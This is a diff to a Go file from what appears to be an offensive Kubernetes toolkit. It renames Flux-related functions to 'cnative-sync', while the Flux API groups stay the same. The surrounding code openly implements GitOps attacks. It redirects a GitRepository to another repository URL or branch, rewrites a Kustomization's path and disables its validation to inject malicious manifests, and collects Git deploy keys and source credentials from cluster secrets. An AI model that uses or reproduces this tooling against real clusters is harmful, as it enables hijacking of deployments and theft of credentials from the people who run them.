@@ -13,26 +13,26 @@ import (
 )
 
 var (
-	fluxGitRepoGVR = schema.GroupVersionResource{
+	cnativeSyncGitRepoGVR = schema.GroupVersionResource{
 		Group: "source.toolkit.fluxcd.io", Version: "v1", Resource: "gitrepositories",
 	}
-	fluxKustomizationGVR = schema.GroupVersionResource{
+	cnativeSyncKustomizationGVR = schema.GroupVersionResource{
 		Group: "kustomize.toolkit.fluxcd.io", Version: "v1", Resource: "kustomizations",
 	}
-	fluxHelmReleaseGVR = schema.GroupVersionResource{
+	cnativeSyncHelmReleaseGVR = schema.GroupVersionResource{
 		Group: "helm.toolkit.fluxcd.io", Version: "v2", Resource: "helmreleases",
 	}
 )
 
-// PoisonFluxGitSource modifies a Flux GitRepository's URL or branch to redirect source reconciliation.
-func PoisonFluxGitSource(ctx context.Context, dynClient dynamic.Interface, ns, name, repoURL, branch string) (*PoisonResult, error) {
+// PoisonCnativeSyncGitSource modifies a cnative-sync GitRepository's URL or branch to redirect source reconciliation.
+func PoisonCnativeSyncGitSource(ctx context.Context, dynClient dynamic.Interface, ns, name, repoURL, branch string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "flux",
+		Platform: "cnative-sync",
 		Action:   "poison_source",
 		Target:   name,
 	}
 
-	gitRepo, err := dynClient.Resource(fluxGitRepoGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
+	gitRepo, err := dynClient.Resource(cnativeSyncGitRepoGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get gitrepository: %v", err)
 		return result, nil
@@ -52,7 +52,7 @@ func PoisonFluxGitSource(ctx context.Context, dynClient dynamic.Interface, ns, n
 		}
 	}
 
-	_, err = dynClient.Resource(fluxGitRepoGVR).Namespace(ns).Update(ctx, gitRepo, metav1.UpdateOptions{})
+	_, err = dynClient.Resource(cnativeSyncGitRepoGVR).Namespace(ns).Update(ctx, gitRepo, metav1.UpdateOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("update failed: %v", err)
 		return result, nil
@@ -63,15 +63,15 @@ func PoisonFluxGitSource(ctx context.Context, dynClient dynamic.Interface, ns, n
 	return result, nil
 }
 
-// PoisonFluxKustomization modifies a Flux Kustomization's path and disables validation to inject malicious manifests.
-func PoisonFluxKustomization(ctx context.Context, dynClient dynamic.Interface, ns, name, path string) (*PoisonResult, error) {
+// PoisonCnativeSyncKustomization modifies a cnative-sync Kustomization's path and disables validation to inject malicious manifests.
+func PoisonCnativeSyncKustomization(ctx context.Context, dynClient dynamic.Interface, ns, name, path string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "flux",
+		Platform: "cnative-sync",
 		Action:   "poison_kustomization",
 		Target:   name,
 	}
 
-	ks, err := dynClient.Resource(fluxKustomizationGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
+	ks, err := dynClient.Resource(cnativeSyncKustomizationGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get kustomization: %v", err)
 		return result, nil
@@ -86,7 +86,7 @@ func PoisonFluxKustomization(ctx context.Context, dynClient dynamic.Interface, n
 
 	_ = unstructured.SetNestedField(ks.Object, false, "spec", "validation")
 
-	_, err = dynClient.Resource(fluxKustomizationGVR).Namespace(ns).Update(ctx, ks, metav1.UpdateOptions{})
+	_, err = dynClient.Resource(cnativeSyncKustomizationGVR).Namespace(ns).Update(ctx, ks, metav1.UpdateOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("update failed: %v", err)
 		return result, nil
@@ -97,10 +97,10 @@ func PoisonFluxKustomization(ctx context.Context, dynClient dynamic.Interface, n
 	return result, nil
 }
 
-// StealFluxCredentials searches for Git deploy keys and source credentials in Flux's namespace.
-func StealFluxCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
+// StealCnativeSyncCredentials searches for Git deploy keys and source credentials in the cnative-sync namespace.
+func StealCnativeSyncCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("Flux Source Credentials:\n")
+	sb.WriteString("cnative-sync Source Credentials:\n")
 
 	secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
 	if err != nil {
@@ -131,11 +131,11 @@ func StealFluxCredentials(ctx context.Context, client kubernetes.Interface, ns s
 	return sb.String(), nil
 }
 
-// ListFluxResources enumerates GitRepositories, Kustomizations, and HelmReleases in the given namespace.
-func ListFluxResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
+// ListCnativeSyncResources enumerates GitRepositories, Kustomizations, and HelmReleases in the given namespace.
+func ListCnativeSyncResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
 	var sb strings.Builder
 
-	repos, err := ListCRDs(ctx, dynClient, fluxGitRepoGVR, ns)
+	repos, err := ListCRDs(ctx, dynClient, cnativeSyncGitRepoGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "GitRepositories (%d):\n", len(repos))
 		for _, r := range repos {
@@ -145,7 +145,7 @@ func ListFluxResources(ctx context.Context, dynClient dynamic.Interface, ns stri
 		}
 	}
 
-	kustomizations, err := ListCRDs(ctx, dynClient, fluxKustomizationGVR, ns)
+	kustomizations, err := ListCRDs(ctx, dynClient, cnativeSyncKustomizationGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "Kustomizations (%d):\n", len(kustomizations))
 		for _, k := range kustomizations {
@@ -155,7 +155,7 @@ func ListFluxResources(ctx context.Context, dynClient dynamic.Interface, ns stri
 		}
 	}
 
-	helmReleases, err := ListCRDs(ctx, dynClient, fluxHelmReleaseGVR, ns)
+	helmReleases, err := ListCRDs(ctx, dynClient, cnativeSyncHelmReleaseGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "HelmReleases (%d):\n", len(helmReleases))
 		for _, h := range helmReleases {
